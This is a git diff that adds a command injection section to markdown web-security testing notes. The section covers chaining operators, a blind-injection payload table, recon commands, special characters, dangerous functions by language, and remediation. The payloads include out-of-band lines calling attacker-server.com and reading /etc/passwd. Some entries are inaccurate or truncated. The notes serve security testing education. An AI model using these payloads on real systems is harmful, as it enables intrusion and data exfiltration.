@@ -99,7 +99,7 @@
 - Substring: Others: SUBSTRING('footbar', 4, 2); Oracle: SUBSTR('footbar', 4, 2)
 - [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
-**Remediation**  
+**Remediation**
 - Prepared Statements (With Parameterized Queries)
   `PreparedStatement pstmt = connection.prepareStatement(query);`
 - Whitelisting permitted input values
@@ -623,7 +623,94 @@
   - Gain access as an admin and perform the required action
     
 ## Command Injection
-Content for Command Injection...
+**How to test**
+- command chaining: `;` `&` `|`
+- Unix: use backstick or dollar to perform inline execution
+- conditional execution: `&&` `||`   
+- File manipulation: `> malicious_script.sh`   
+- Input redirection: `echo "data" > output.txt`   
+- Subshells: `$(echo "whoami")`
+
+**Blind based Command Injection Techniques**
+| **Technique**                   | **Payload**                                         | **Observation for Successful Exploit**                                                                 |
+|---------------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------------------------|
+| **Time-Based Techniques**       |                                                     |                                                                                                        |
+| Delay Using `sleep`             | `; sleep 5`                                         | **Observation:** Monitor the response time of the application. A delay of approximately 5 seconds indicates success.   |
+| Time-Delayed Payload            | `; ping -c 10 192.168.0.1`                          | **Observation:** Monitor network traffic or logs for 10 ICMP requests to 192.168.0.1.                   |
+| Time-Based Blind SQL Injection  | `'; if (sleep(5)) pg_sleep(5); --`                  | **Observation:** Delay in application response, indicating successful execution of sleep function.     |
+| **Out-of-Band (OOB) Techniques**|                                                     |                                                                                                        |
+| DNS-Based OOB                   | `; nslookup attacker-server.com`                    | **Observation:** Monitor DNS server logs for queries originating from the application server.          |
+| HTTP-Based OOB                  | `; curl http://attacker-server.com/`                 | **Observation:** Monitor web server logs for HTTP requests originating from the application server.    |
+| SMTP-Based OOB                  | `; mail -s "Exploit" attacker@example.com < /dev/null` | **Observation:** Monitor email logs or inbox for emails sent from the application server.             |
+
+**Useful Commands**
+| **Purpose of Command**      | **Linux Command**   | **Windows Command**     |
+|-----------------------------|---------------------|-------------------------|
+| **Name of Current User**    | `whoami`            | `whoami`                |
+| **Operating System**        | `uname -a`          | `ver`                   |
+| **Network Configuration**   | `ifconfig`          | `ipconfig /all`         |
+| **Network Connections**     | `netstat -an`       | `netstat -an`           |
+| **Running Processes**       | `ps -ef`            | `tasklist`              |
+
+**Special Characters for Command Injection**
+| **Special Character** | **Description**                                                                 | **Example Payload**                                     |
+|-----------------------|---------------------------------------------------------------------------------|---------------------------------------------------------|
+| **Whitespace** (` `)  | Separates command arguments.                                                    | `ls -la /tmp`                                           |
+| **Semicolon** (`;`)   | Terminates current command; allows execution of subsequent commands.           | `ls; whoami`                                            |
+| **Pipe**        | Redirects output of one command as input to another command.                    | `cat /etc/passwd \| grep root`                          |
+| **Ampersand** (`&`)   | Executes multiple commands sequentially in the background.                      | `echo hello & echo world`                               |
+| **Backticks** (`` ` ``) or `$()` | Executes enclosed command and substitutes its output.                | `echo $(whoami)`                                        |
+| **Redirects** (`>`, `>>`, `<`) | Redirects input or output of commands.                                  | `echo "data" > file.txt`                                |
+| **Double Quotes** (`"`) | Allows interpretation of enclosed variables and commands.                | `echo "Hello $(whoami)"`                                |
+| **Single Quotes** (`'`) | Treats enclosed characters literally, avoiding shell interpretation.      | `echo '$(whoami)'`                                      |
+| **Parentheses** (`(`, `)`) | Groups commands and changes their precedence. 
+
+**Code Review: Dangerous OS command function**
+**Java**
+- `Runtime.exec()`
+- `ProcessBuilder.start()`
+- `getAttribute()`, `putValue()`, `getValue()`
+- `java.net.Socket`, `java.io.fileInputStream`, `java.io.FileReader`
+
+**ASP.NET**
+- `HttpRequest.Params`
+- `HttpRequest.Url`
+- `HttpRequest.Item`
+
+**Python**
+- `exec`
+- `eval`
+- `os.system`
+- `os.popen`
+- `subprocess.popen`
+- `subprocess.call`
+
+**PHP**
+- `system`
+- `shell_exec`
+- `exec`
+- `proc_open`
+- `eval`
+- `passthru`
+- `expect_open`
+- `ssh2_exec`
+- `popen`
+
+**C/C++**
+- `system`
+- `exec`
+- `ShellExecute`
+- `execlp`
+
+**Perl**
+- `CGI.pm`
+- `referer`
+- `cookie`
+- `ReadParse`
+
+**Remediation**
+- Never call out to OS commands
+- Strong input validation (permited values, number, alphanumber, no other syntax or whitespace)
 
 ### Command Injection Lab
 
